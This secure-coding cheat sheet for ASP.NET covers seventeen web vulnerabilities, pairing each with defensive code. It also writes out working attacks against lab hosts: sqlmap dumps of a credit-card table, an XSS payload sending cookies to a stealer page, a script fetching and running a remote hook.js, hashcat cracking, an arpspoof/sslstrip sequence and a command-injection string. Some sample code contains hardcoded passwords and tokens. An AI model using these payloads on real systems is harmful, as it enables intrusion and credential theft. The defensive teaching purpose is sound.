#Secure Programming Cheat Sheet
**Contents:**

1. SQL Injection
2. XSS
3. Broken Authentication and Session Management
4. IDOR
5. CSRF
6. Security Misconfiguration
7. Insecure Crypto Storage
8. Failure To Restrict URL
9. TLS
10. Unvalidated Redirect and Forward
11. File Upload
12. ReDoS
13. OS Command Injection
14. Mass Assignment
15. CaptchaByPass
16. Service Design Misconfiguration
17. Directory Traversal

**01 - SQL Injection**<br/>
<code>sqlmap -u "http://1.candan.local/Product.aspx?ProductSubCategoryId=26" -p ProductSubCategoryId --flush-session
sqlmap -u "http://1.candan.local/Product.aspx?ProductSubCategoryId=26" -p ProductSubCategoryId --sql-query="SELECT TOP 5 \* FROM [1-Injection].[dbo].[CreditCard]" --tamper="randomcase"
sqlmap -u "http://1.candan.local/Product.aspx?ProductSubCategoryId=26" -p ProductSubCategoryId -D 1-Injection --tables --tamper="nonrecursivereplacement"
</code><br/>
1- DB Permission (Principle of least privilege)

2- Parameterized SQL query

     varsqlString ="SELECT \* FROM Product WHERE ProductSubCategoryID = @ProductSubCategoryId";

      command.Parameters.Add("@ProductSubCategoryID",SqlDbType.VarChar).Value = productSubCategoryId;

3- Stored Procedure

     varsqlString ="GetProducts";

     command.CommandType =CommandType.StoredProcedure;

     command.Parameters.Add("@ProductSubCategoryID", SqlDbType.VarChar).Value = productSubCategoryId;

4- WhiteListing

      intid;

      if(!int.TryParse(productSubCategoryId,outid))

           {thrownewApplicationException("ID wasn't an integer");}

       command.Parameters.Add("@ProductSubCategoryID",SqlDbType.Int).Value = id;

5- ORM

      vardc =newInjectionEntities();

          ProductGridView.DataSource = dc.Products.Where(p => p.ProductSubcategoryID == id).ToList();

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

**02 - XSS**

      localhost:11209/Search.aspx?q=lager<script>location.href='http://localhost:52305/CookieStealer.aspx?cookie='%2Bdocument.cookie;</script>

      http://localhost:11209/Search.aspx?q=lager%3CIMG%20SRC=%22/%22%20onerror=%22alert%28%27xxs%27%29%22%3E

      http://localhost:11209/Search.aspx?q=alert%28%60XSS%60%29

Product Description - XSS Payload Injector

[http://www.multidmedia.com/common/img/Features/Flash11.png](http://www.multidmedia.com/common/img/Features/Flash11.png)

<script type="text/javascript">

var xmlhttp;

if (window.XMLHttpRequest){

  xmlhttp=new XMLHttpRequest();}

else{

  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");}

xmlhttp.open("GET","http://172.16.52.213:3000/hook.js",false);

xmlhttp.send();

if(xmlhttp.status==200){

  var str=xmlhttp.responseText;

  document.write("\x3Cscript\x3E"+ str +"\x3C/script\x3E");}

</script>

1- Output Encoding

     SearchTerm.Text =AntiXssEncoder.HtmlEncode(searchTerm,true);

2- Anti-XSS Library

      SearchTerm.Text =AntiXssEncoder.HtmlEncode(searchTerm,true);

      varq =<%=Microsoft.Security.Application.Encoder.JavaScriptEncode(Request.QueryString["q"])%>

3- MVC

4- WhiteList

     if(!Regex.IsMatch(searchTerm,@"^[\p{L} \.\-]+$"))

5- RequestValidation

     <httpRuntimetargetFramework="4.5"requestValidationMode="4.5"/>

     <pagesvalidateRequest="true">

     varsearchTerm = Request.Unvalidated.QueryString["q"]

     [AllowHtml](MVC - Password)

6- X-XSS-Protection

        <httpprotocol>

          <customheaders>

            <removename="X-Powered-By">

              <addname="X-XSS-Protection"value="1; mode=block">

              </add>

            </remove>

          </customheaders>

        </httpprotocol>

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

**03 - Broken Authentication**

<code>http://localhost:64883/%28S%28zsagmjovei3odm4bqbxuczec%29%29/</code>

1- Set Cookie

      <sessionStatecookieless="UseUri"/>

2- Membership Provider

      connectionString="Data Source=(local);Initial Catalog=3-BrokenAuth;User Id=3-BrokenAuth-User;Password=zmGCd4vt4XlLfVc3gkzF;"

      <membership ...>
      <providers>
            <add minRequiredPasswordLength=10 minRequiredNonalphanumericCharacters=2 .../>
       </providers>
      </membership>

3- Session and Form Timeout

      <formsloginUrl="~/Account/Login"timeout=""/>

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

**04 - Insecure Direct Object References**

http://localhost:10705/UserProfile?userName=candan

1- Fix authorization

      if(User. [Identity.Name](http://identity.name) != userName) { thrownewApplicationException("User not authorised"); }

2- Indirect Reference Maps

      publicstaticclassIndirectRefMap ...

      UserProfile?id=@User.Identity.Name.GetIndirectRef()

3- ID obfuscation with GUID

       stringindirectRefGuid =new Guid().ToString();

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

**05 - CSRF**

Update profile

http://evil.5.candan.local/

1- AntiCSRFToken (MVC)

      @Html.AntiForgeryToken()

      [ValidateAntiForgeryToken]

2- AntiCSRFToken (WebForms)

        privateconststringAntiXsrfTokenKey ="\_\_AntiXsrfToken";

        privateconststringAntiXsrfUserNameKey ="\_\_AntiXsrfUserName"; ...

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

**06 - Security Misconfiguration**

http://localhost:56524/Widgets.aspx?CategoryId=1&TypeId=a

inurl:elmah.axd "error log for"

1- Custom Errors (HTTP 500)

     <customErrorsmode="On"/>

2- Custom Errors (HTTP 302)

     <customErrorsmode="On"defaultRedirect="Error.aspx"/>

3- Custom Errors (HTTP 200)

     <customErrorsmode="On"defaultRedirect="Error.aspx"redirectMode="ResponseRewrite"/>

4- Trace.axd

     <traceenabled="false"/>

5- Update Nuggets (MS12-007 - Vulnerability in AntiXSS Library Could Allow Information Disclosure)

6- Encrypt Connection Strings

      C:\Windows\Microsoft.NET\Framework64\v4.0.30319>

      aspnet\_regiis.exe -site "6.candan.local" -app "/" -pe "connectionStrings"  (Encrypt)

      aspnet\_regiis.exe -site "6.candan.local" -app "/" -pd "connectionStrings"  (Decrypt)

7- Web.Relase.Config Config Transform

     <tracexdt:Transform="Remove"/>

8- Retail Mode

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\machine.config

      <system.web><deploymentretail="true"/>...

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

**07-Insecure Cryptographic Storage**

      SELECT'$episerver$\*0\*'+[PasswordSalt]+'\*'+[Password]FROM[7-CryptoStorage].[dbo].[aspnet\_Membership]

      hashcat-cli64.exe -m 0 Z:\candan\Documents\Security\Hack\Dictionary\sony\_hashes.md5.txt Z:\candan\Documents\Security\Hack\Dictionary\hashkiller-dict.txt

      hashcat-cli64.exe -m 141 Z:\candan\Documents\Security\Hack\Dictionary\sony\_hashes.txt Z:\candan\Documents\Security\Hack\Dictionary\hashkiller-dict.txt

1- MVC Membership Provider (System.Web.Helpers Crypto.cs)

[https://aspnetwebstack.codeplex.com/SourceControl/latest#src/System.Web.Helpers/Crypto.cs](https://aspnetwebstack.codeplex.com/SourceControl/latest#src/System.Web.Helpers/Crypto.cs)

      /\* ======================= \* HASHED PASSWORD FORMATS \* =======================

      \* Version 0:

      \* PBKDF2 with HMAC-SHA1, 128-bit salt, 256-bit subkey, 1000 iterations.

      \* (See also: SDL crypto guidelines v5.1, Part III)

      \* Format: { 0x00, salt, subkey }

      \*/

      public staticstringHashPassword(stringpassword) {if(password ==null) {thrownewArgumentNullException("password"); }

2- BCrypt.net (nugget)

      <?xmlversion="1.0"encoding="UTF-8"?>

      <configuration>

        <!--bunch of other stuff-->

        <mscorlib>

        <cryptographySettings>

          <cryptoNameMapping>

            <cryptoClasses>

              <cryptoClassPBKDF2="Zetetic.Security.Pbkdf2Hash, Zetetic.Security, Version=1.0.0.0, Culture=neutral, PublicKeyToken=86474ebf447b9da7"/>

              <cryptoClassBCRYPT="Zetetic.Security.BCryptHash, Zetetic.Security, Version=1.0.0.0, Culture=neutral, PublicKeyToken=86474ebf447b9da7"/>

            </cryptoClasses>

            <nameEntryname="PBKDF2"class="PBKDF2"/>

            <nameEntryname="BCRYPT"class="BCRYPT"/>

          </cryptoNameMapping>

        </cryptographySettings>

  </mscorlib>

</configuration>

3- Zetetic (nugget)

[https://www.zetetic.net/blog/2012/3/29/strong-password-hashing-for-aspnet.html](https://www.zetetic.net/blog/2012/3/29/strong-password-hashing-for-aspnet.html)

      <membershipdefaultProvider="ssp"

        userIsOnlineTimeWindow="20"

        hashAlgorithmType="PBKDF2">
      
            <providers>

        <clear/>

        <addname="ssp"

          type="System.Web.Security.SqlMembershipProvider"

          connectionStringName="ApplicationServices"

          passwordFormat="Hashed"

          enablePasswordRetrieval="false"

          enablePasswordReset="true"

          requiresQuestionAndAnswer="false"

          requiresUniqueEmail="false"

          maxInvalidPasswordAttempts="5"

          minRequiredPasswordLength="6"

          minRequiredNonalphanumericCharacters="0"

          passwordAttemptWindow="10"

          applicationName="/"/>

        </providers>

      </membership>

4- DPAPI

      varsecret ="My secret text";

      varsecretBytes =Encoding.Unicode.GetBytes(secret);

          var encryptedBytes = ProtectedData.Protect(secretBytes, null, DataProtectionScope.LocalMachine);

      vardecryptedBytes =ProtectedData.Unprotect(encryptedBytes,null,DataProtectionScope.LocalMachine);

          var decryptedSecret = Encoding.Unicode.GetString(decryptedBytes);

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

**08 - Failure to Restrict URL Access**

      http://localhost:45018/admin

1- Web.config path authorization

        <locationpath="Admin">

        <system.web>

          <authorization>

            <denyusers="?"/>

            <allowroles="Admin"/>

          </authorization>

        </system.web>

  </location>

2- Controller Authorization

      routes.MapRoute("Admin","Administrator",new{ controller ="Admin", action ="Index"});

      [Authorize(Roles ="Admin")]

3- Membership Provider User & Role Control

      System.Web.Security.Roles.AddUserToRole("candan", "Admin");

      WebMatrix.WebData.WebSecurity.CreateUserAndAccount("newUser","password");

      @if(User.IsInRole("Admin"))...

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

**09 - Insufficient Transport Layer Protection**

      echo "1" > /proc/sys/net/ipv4/ip\_forward

      arpspoof -i eth0 -t 172.16.52.210 172.16.52.1

      iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8000

      sslstrip -l 8000

[http://9.candan.local/Account/Manage](http://9.candan.local/Account/Manage)

1- Secure Cookie (Problem?)

      <formsloginUrl="~/Account/Login"timeout="2880"requireSSL="true"/>

2- Secure All Cookies (Problem?)

      <httpCookiesrequireSSL="true"/>

3- Secure Connection (SSLStrip!)

      if(!Request.IsSecureConnection)

          {

        varsecureUrl = Request.Url.ToString().Replace("http://","https://");

            Response.RedirectPermanent(secureUrl);

          }

4- Secure Connection (MVC)

     [RequireHttps]

5- Mixed Mode

https://9.candan.local/Home/Contact

     <scriptsrc="//ajax. [aspnetcdn.com/ajax/jquery.validate/1.9/jquery.validate.min.js](http://aspnetcdn.com/ajax/jquery.validate/1.9/jquery.validate.min.js)" type="text/javascript"></script>

6- HSTS

        protectedvoidApplication\_BeginRequest(Objectsender,EventArgse)

            {

            switch(Request.Url.Scheme)

                {

                case"https":

                        Response.AddHeader("Strict-Transport-Security","max-age=31536000");

                    break;

                case"http":

                    varpath ="https://"+ Request.Url.Host + Request.Url.PathAndQuery;

                        Response.Status ="301 Moved Permanently";

                        Response.AddHeader("Location", path);

                    break;

                }

            }

7- HTTPS Everywhere & DNSCrypt (Bonus!)

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

**10 - Unvalidated Redirects and Forwards**

      http://localhost:1303/redirect.aspx?url=%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%35%2e%63%61%6e%64%61%6e%2e%6c%6f%63%61%6c%2f%6d%61%6c%77%61%72%65%2e%65%78%65

1- Whitelisting

      vardb =newTrustedUrlContext();

          if (!db.TrustedUrls.Any(t => t.Url == url))

        thrownewApplicationException("URL not trusted");

2- Referrer Checking

      varreferrer = Request.UrlReferrer;

          if (referrer == null || referrer.Host != Request.Url.Host)

            thrownewApplicationException("Referrer is not the same site");

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

**11 - File Upload**

Content-Type: image/png

Chech file extention and True File type with file header.

[http://www.garykessler.net/library/file\_sigs.html](http://www.garykessler.net/library/file_sigs.html)

[http://www.filesignatures.net/index.php](http://www.filesignatures.net/index.php)

      (1) string[] validFileTypes = {"JPG","JPEG","PNG","TIF","TIFF","GIF","BMP","ICO"};

      (2)         imageHeader.Add("JPG",newbyte[][] {newbyte[] { 0xFF, 0xD8, 0xFF, 0xE0 },

                                                  newbyte[] { 0xFF, 0xD8, 0xFF, 0xE1 },

                                                  newbyte[] { 0xFF, 0xD8, 0xFF, 0xE2 },

                                                  newbyte[] { 0xFF, 0xD8, 0xFF, 0xE3 },

                                                      newbyte[] { 0xFF, 0xD8, 0xFF, 0xE8 },

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

**12 - ReDoS**

candan@aaaaaaaaaaaaaaaaaaaaaaaa!.com

Do not use recursive Regex Pattern.

[https://www.owasp.org/index.php/Regular\_expression\_Denial\_of\_Service\_-\_ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS)

Examples of Evil Patterns:

      (a+)+

      ([a-zA-Z]+)\*

      (a|aa)+

      (a|a?)+

      (.\*a){x} | for x > 10

      ^(([a-z])+.)+[A-Z]([a-z])+$

      ^([a-zA-Z0-9])(([\-.]|[\_]+)?([a-zA-Z0-9]+))\*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$

      (1)         //RFC #5322 or #822

            stringregexstr =@"^\w+([-+.']\w+)\*@\w+([-.]\w+)\*\.\w+([-.]\w+)\*$";

                regexstr = "^[a-zA-Z0-9\_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+$";

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

**13 - OS Command Injection**

www.google.com && dir .

Validate input with regex and and do not use cmd.exe.

      (1)         //RFC #1034

            stringValidIpAddressRegex =@"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$";

                string ValidHostnameRegex = @"^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]\*[a-zA-Z0-9])\.)\*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]\*[A-Za-z0-9])$";

            if(Regex.IsMatch(tbxDomain, ValidHostnameRegex))

                {

                varproc =newProcess

                    {

                        StartInfo =newProcessStartInfo

                        {

      (2)                     FileName = "nslookup.exe",

                            Arguments = tbxDomain,

                            UseShellExecute =false,

                            RedirectStandardOutput =true,

                            CreateNoWindow =true

                        }

                    };

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

**14 - Mass Assignment**

Salary = 20000

Use ViewModel and create anonymous dynamic type.

      (1)         publicclassEmployeeEditViewModel

            vartmp = nwe.Employees.Where(emp => emp.EmployeeID == employeeId)

                                       .SelectPartially(typeof(EmployeeEditViewModel).GetProperties().Select(p => p.Name).ToList<string>())

                                       .FirstOrDefault(); //Dynamic Anonymous Type

            EmployeeEditViewModelevm =newEmployeeEditViewModel();

                CopyFieldValues(tmp, evm);

...

      (2)             NORTHWNDEntitiesnwe =newNORTHWNDEntities();

                    nwe.Configuration.ProxyCreationEnabled =false;

                Employeeoriginal = nwe.Employees.Where(emp => emp.EmployeeID == employeeId).SingleOrDefault();

                    CopyPropertyValues(e, original);

                    nwe.SaveChanges();

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

**15 - Captcha Bypass**

Replay infinitely

Invalidate the captcha after it is used, and remove it from the session.

        if(Session["captcha"] !=null&& Session["captcha"].ToString() == Request["captcha"].ToString())

            {

                control = true;

...

      (1)     if(Session["captcha"] !=null)

                Session.Remove("captcha");

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

**16 - Design Misconfig**

SOAP UI Unauthenticated call

Validate at server side and use token based service.

      (1)     stringtoken ="MyT0p$3cr3t4uth3nt!c4t!0nT0k3n";

        publicstringAuthenticate(stringusername,stringpassword)

            {

            if(username =="candan"&& password =="password")

                returntoken;

            else

                returnstring.Empty;

            }

      (2)     publicstring GetData(string value)

            {

            varopContext =OperationContext.Current;

            varrequestContext = opContext.RequestContext;

            varheaders = requestContext.RequestMessage.Headers;

            intheaderIndex = headers.FindHeader("Token"," [http://tempuri.org/](http://tempuri.org/)");

            stringuserToken = headers.GetHeader<string>(headerIndex);

            if(userToken == token)

                returnstring.Format("Successfully authenticated and you entered: {0}", value);

            else

                return"Invalid token!";

            }

      (3)     publicstringGetSecretData(stringvalue,stringusertoken)

            {

            if(usertoken == token)

                returnstring.Format("Successfully authenticated and your secret is: {0}", Base64Encode(value));

            else

                return"Invalid token!";

            }

...

                    SimpleWCFService.Service1Clientss =newSimpleWCFService.Service1Client();

                stringtoken = ss.Authenticate(tbxUsername.Text, tbxPassword.Text);

                //Token in Message header

                using(OperationContextScopescope =newOperationContextScope(ss.InnerChannel))

                    {

                    MessageHeaderheader =MessageHeader.CreateHeader("Token"," [http://tempuri.org/](http://tempuri.org/)", token);

                    OperationContext.Current.OutgoingMessageHeaders.Add(header);

                        lblResult.Text = ss.GetData(numericUpDown1.Value.ToString());

                    }

                    SimpleWCFService.Service1Clientss =newSimpleWCFService.Service1Client();

                //Token in message body

                stringtoken = ss.Authenticate(tbxUsername.Text, tbxPassword.Text);

                    lblResult.Text = ss.GetSecretData(numericUpDown1.Value.ToString(), token);

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

**17 - Directory Traversal**

http://localhost:55775resize.aspx?image=/images/../web.config&w=300&h=200

Validate inputwith Regex and try to cast output.

      (1)         stringuntrustedPath = Request.QueryString["image"];

            if(!Regex.IsMatch(untrustedPath,@"^(\/images\/[0-9]+.(jpg|png|gif|jpeg))$"))

                {

                    Response.Write("<span style=\"color:red\">Directory traversal attempt!</span><br />"+ untrustedPath +" is not a valid image path.");

                    Response.End();

                return;

                }

...

      (2)                 Imageimage = DrawText("        Image\nnot found!",newFont("Calibri", 24),Color.Red,Color.White);

                        Response.BinaryWrite(imageToByteArray(image));
